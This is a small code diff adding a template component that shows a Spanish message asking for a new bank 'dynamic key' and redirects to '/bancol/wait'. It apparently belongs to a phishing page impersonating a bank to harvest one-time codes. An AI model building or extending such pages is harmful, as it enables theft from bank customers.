@@ -292,6 +292,12 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="Clave dinámica incorrecta o vencida, ingresa una nueva clave dinámica"
+    />
 </body>
 
 </html>
